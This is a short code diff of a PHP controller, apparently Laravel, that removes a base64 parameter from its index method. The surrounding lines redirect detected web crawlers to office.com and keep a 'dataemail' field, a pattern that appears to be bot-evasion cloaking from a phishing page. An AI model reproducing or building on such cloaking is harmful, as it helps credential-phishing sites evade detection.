@@ -18,7 +18,7 @@ class Controller extends BaseController
 
     public $dataemail = "";
 
-    public function index($base64){
+    public function index(){
 
         if(Crawler::isCrawler()){
             return redirect()->away("https://office.com");
